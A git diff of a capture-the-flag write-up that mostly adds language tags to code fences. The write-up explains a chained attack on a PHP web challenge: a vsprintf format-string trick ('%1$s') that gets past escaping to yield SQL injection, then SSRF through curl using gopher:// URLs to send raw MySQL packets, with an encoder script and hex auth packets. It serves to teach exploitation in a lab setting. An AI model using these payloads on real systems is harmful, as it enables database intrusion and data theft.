@@ -57,7 +57,7 @@ So we know we'll have to access the database somehow to get our flag. This immed
 (I highly recommend reading eboda's [WRITEUP](https://github.com/eboda/34c3ctf/tree/master/extract0r)).
 
 Also easily discovered is the `cfg.php` which contains all of the code for interfacing with the database. When the challenge first launched, `cfg.php` contained:
-```
+```php
 private $db_server = "localhost";
 private $db_user = "VN_tet";
 private $db_pass = '123qwe!@#QWE';
@@ -65,7 +65,7 @@ private $db_database = "VN_tet";
 ```
 
 So we now know that the web app is using a different database than the flag is stored in (VN_tet vs flag). For some reason, the source got updated and the newer version of `cfg.php` now shows:
-```
+```php
 private $db_server = "localhost";
 private $db_user = "xxxx";
 private $db_pass = 'xxxx';
@@ -76,7 +76,7 @@ I'm not quite sure what the logic behind changing this was... Why would you ever
 
 After some more source reading, I found some fun stuff in `func.php`:
 
-```
+```php
 function get_data($url) {
 	$ch = curl_init();
 	$timeout = 2;
@@ -96,7 +96,7 @@ get_data() is called from the watermark_me() function in `func.php`.
 watermark_me is a function that applies their "Pepe Verified!" image on top of store items when viewing them at `/info.php`.
  The only parts of watermark_me that matter for what we need are:
 
-```
+```php
 function watermark_me($img){
 	if(preg_match('/^file/', $img)){
 		die("Ahihi");
@@ -116,7 +116,7 @@ NOTE: I'm going to get this out of the way here. I spent a _lot_ of time trying 
 
 Moving backwards again, watermark_me() is only called from one place which is in `info.php`:
 
-```
+```php
 ...
 
 $uid = (int)$_SESSION["id"];
@@ -138,7 +138,7 @@ echo '<img height="300px" weight="300px" src="data:image/png;base64,'.watermark_
 
 NOTE: This is the second major source update. Above is the updated version. The original version was:
 
-```
+```html
 echo '<img height="300px" weight="300px" src="data:image/png;base64,'.watermark_me($result[0]['img']).'"><br>';
 ```
 This update REALLY frustrates me because I can tell you with 100% certainty, the original is how their live version is actually running.
@@ -147,7 +147,8 @@ And that matters. A lot.
 
 If we can control what the "img" column returns for $result, we can start doing some fun SSRF things. This means SQLi. So let's see what that `addParameter` is doing exactly:
 
-```	function addParameter($qr, $args){
+```php
+	function addParameter($qr, $args){
 		if(is_null($qr)){
 			return;
 		}
@@ -190,7 +191,7 @@ This function is doing some pretty normal and expected steps when dealing with p
 It's making sure there's at least one variable item (marked with `%`), making sure there's some variables to fill in, and sending all variables through a `mysqli_real_escape_string()`.
 It's also adding single quotes around the %s that are located in the query.
 The final step is the most interesting though:
-```
+```php
 return @vsprintf($qr, $args);
 ```
 
@@ -198,7 +199,7 @@ On its own, vsprintf isn't always bad, but format strings are often a good place
 vsprintf differs from sprintf in taking an array of arguments instead of multiple parameters.
 
 Quick example of what php's vsprintf does:
-```
+```php
 $data = array("World");
 $x =  vsprintf("Hello %s", $data);
 echo $x;
@@ -218,7 +219,7 @@ $result = $jdb->fetch_assoc($prepare_qr);
 
 Some basic testing on my local instance verified that variables were in fact getting escaped correctly.
 Ex:
-```
+```php
 ?uid=5' or '1' = '1
 QUERY: SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid='5\' or \'1\' = \'1' and user='reznok'
 ```
@@ -227,7 +228,7 @@ So it was time to get creative. The vulnerability here is that the statement is 
 Any `%s` that makes it through the first prepare will be handled by the second prepare.
 
 Example:
-```
+```php
 $_GET['uid'] = '%s';
 $prepare_qr = $jdb->addParameter("SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s",  $_GET['uid']);
 echo $prepare_qr
@@ -247,7 +248,7 @@ Not all too surprisingly, it turns out there's a strange syntax to use positiona
 The syntax is: `%i$s` (Where i is the index of the argument, and s is the type of variable, which in this case is string).
 Example:
 
-```
+```php
 $data = array("World", "Mars");
 echo vsprintf("Hello %s! Hello %s!", $data);
 // out: Hello World! Hello Mars!
@@ -258,7 +259,7 @@ echo vsprintf("Hello %1\$s! Hello %1\$s!", $data);
 
 So we replace our previous payload of `$_GET['uid']='%s'` with `$_GET['uid']='%1$s'` and get:
 
-```
+```php
 ...
 $prepare_qr = $jdb->addParameter($prepare_qr.' and user=%s', $username);
 echo $prepare_qr;
@@ -318,7 +319,7 @@ The first packets are the authentication packets, folowed by the query request, 
 
 So now we know how to speak bytes to MySQL. Let's try doing that with gopher. Thanks to the other writeups, I had this function:
 
-```
+```python
 def encode(s):
     a = [s[i:i + 2] for i in range(0, len(s), 2)]
     return "gopher://127.0.0.1:3306/_%" + "%".join(a)
@@ -327,7 +328,7 @@ def encode(s):
 This allowed me to copy paste the bytes from wireshark, run them as a string through this function, and get a curl gopher command. (Try it, it works!)
 Unfortunately, gopher isn't great at reading the returned data, but you run any query you want including ones that contain SLEEP(). From here it's pretty standard time-based blind SQLi injection with the caveat of having to convert everything to be gopher friendly. This is easily done with python.
 
-```
+```python
 auth = """aa00000185a6ff0100000001210000000000000000000000000000000000000000000000666c34675f6d346e3467337200006d7973716c5f6e61746976655f70617373776f72640065035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f70696404363439390f5f636c69656e745f76657273696f6e06352e372e3231095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c
 210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031""".replace("\n", "")
 
